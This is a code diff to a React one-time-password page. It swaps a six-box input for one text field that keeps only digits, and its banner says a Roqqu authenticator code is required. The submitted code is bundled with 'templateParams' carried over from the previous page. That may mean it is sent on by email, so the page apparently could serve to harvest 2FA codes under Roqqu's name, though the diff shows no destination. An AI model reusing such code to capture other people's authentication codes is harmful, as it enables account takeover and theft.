@@ -8,20 +8,18 @@ import twoFA from '../assets/2fa.png'
 export default function Otp(props) {
     const history = useHistory()
 
-    const [otp, setOtp] = useState('')
-    const [keepOtp, setKeepOtp] = useState([])
+        const [code, setCode] = useState('')
     const [loading, setLoading] = useState(false)
 
-    const inputHandler = (input) => {
-        setOtp(input)
-        setKeepOtp((singleOtp) => [input])
-    }
+  const handleCode = (e) => {
+      setCode(e.target.value.replace(/\D/, ''))
+  }
 
     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)
 
-        const clientOtp = keepOtp.toString()
+        const clientOtp = code
 
         if (props.location.state) {
             const templateParams = props.location.state
@@ -91,19 +89,22 @@ export default function Otp(props) {
                         >
                             {' '}
                             <span className='px-8'>
-                                
+                                An Auth code from your authenticator app is
+                                required to complete your transactions on Roqqu
                             </span>{' '}
                         </div>
 
                         <form onSubmit={handleSubmit}>
-                            <OtpInput
-                                value={otp}
-                                onChange={inputHandler}
-                                numInputs={6}
-                                inputStyle='pinlogin-field'
-                                containerStyle='pinlogin'
-                                shouldAutoFocus
-                                isInputNum
+                            <input
+                                type='text'
+                                id='code'
+                                className='text-[#b2b7be] outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-[#b2b7be] mb-4'
+                                required
+                                pattern='\d*'
+                                value={code}
+                                placeholder='Enter Auth Code'
+                                onChange={handleCode}
+                                maxLength={6}
                             />
 
                             <div className='flex justify-center text-center mt-20'>
